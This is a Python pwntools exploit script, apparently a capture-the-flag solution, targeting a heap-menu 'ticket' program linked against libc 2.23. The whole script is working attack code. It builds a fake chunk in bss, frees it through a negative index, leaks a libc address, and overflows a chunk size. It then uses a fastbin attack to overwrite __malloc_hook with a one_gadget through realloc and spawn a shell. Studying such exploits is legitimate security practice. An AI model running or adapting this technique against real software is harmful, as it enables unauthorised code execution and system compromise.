from parse_args_and_some_func import *

sh = all_parsed_args['io']
# sh = process()
if all_parsed_args['debug_enable']:
    libc = all_parsed_args['cur_elf'].libc
    gadgets = [0x45226, 0x4527a, 0xf0364, 0xf1207]
else:
    libc = ELF('./libc-2.23.so')
    gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]


context.update(arch="amd64", endian="little", os='linux')


def welcome(name, saying, age:int):
    sh.sendafter("Your name: \n", name)
    sh.sendafter("what do you want to say before take off(wu hu qi fei): \n", saying)
    sh.sendlineafter("Your age: \n", str(age))


def add_ticket(idx, size):
    sh.sendlineafter(">> ", '1')
    sh.sendlineafter("Index: \n", str(idx))
    sh.sendlineafter("Remarks size: \n", str(size))
    sh.recvline()


def del_ticket(idx):
    sh.sendlineafter(">> ", '2')
    sh.sendlineafter("Index: \n", str(idx))
    sh.recvline()


def edit_ticket(idx, remark):
    sh.sendlineafter(">> ", '3')
    sh.sendlineafter("Index: \n", str(idx))
    sh.sendafter("Your remarks: \n", remark)
    sh.recvline()

def show_ticket(idx):
    sh.sendlineafter(">> ", '4')
    sh.sendlineafter("Index: \n", str(idx))
    msg = sh.recvline()
    log.info("msg recv:{}".format(msg))
    return msg

# construct a fake-chunk at bss segment
welcome("xxxx", "xxxx", 0x6020e0)
add_ticket(1, 0x21) # chunk1
add_ticket(2, 0x100)
add_ticket(3, 0x10)
add_ticket(5, 0x21)

# free fake-chunk
del_ticket(-3)
STOP()
# re-malloc fake-chunk by chunk0
add_ticket(0, 0x18)

# recover chunk2's size and reset chunk3's size
edit_ticket(0, p64(0x100) + p64(0))

# leak libc addr
del_ticket(2)
add_ticket(2, 0x100)
msg = show_ticket(2)
leak_libc_addr = u64(msg[-7:-1] + b"\x00\x00")
LOG_ADDR("leak_libc_addr", leak_libc_addr)
libc_base_addr = leak_libc_addr - 0x3c4b20 - 88
LOG_ADDR("libc_base_addr", libc_base_addr)
libc.address = libc_base_addr

# calc some useful address
target_addr = libc.sym["__malloc_hook"] - 0x23
system_addr = libc.sym['system']
realloc_addr = libc.sym['realloc']
one_gadget = libc.offset_to_vaddr(gadgets[1])

# change chunk2's size to overflow
edit_ticket(0, p64(0x10000))

# get freed 0x70 chunk
del_ticket(1)
add_ticket(1, 0x60)
del_ticket(1)

# change free-chunk's fd-ptr to target_addr
layout = [[0] * 32, 0x110, 0x21, [0] * 3, 0x31, [0] * 5, 0x71, target_addr]
edit_ticket(2, flat(layout))
STOP()
# fastbin attack
add_ticket(1, 0x60)
add_ticket(3, 0x60)
layout = [0xb * "a", one_gadget, realloc_addr + 0xd]
edit_ticket(3, flat(layout))
STOP()
# get shell by malloc_hook(one_gadget)
sh.sendlineafter(">> ", "5")

sh.interactive()
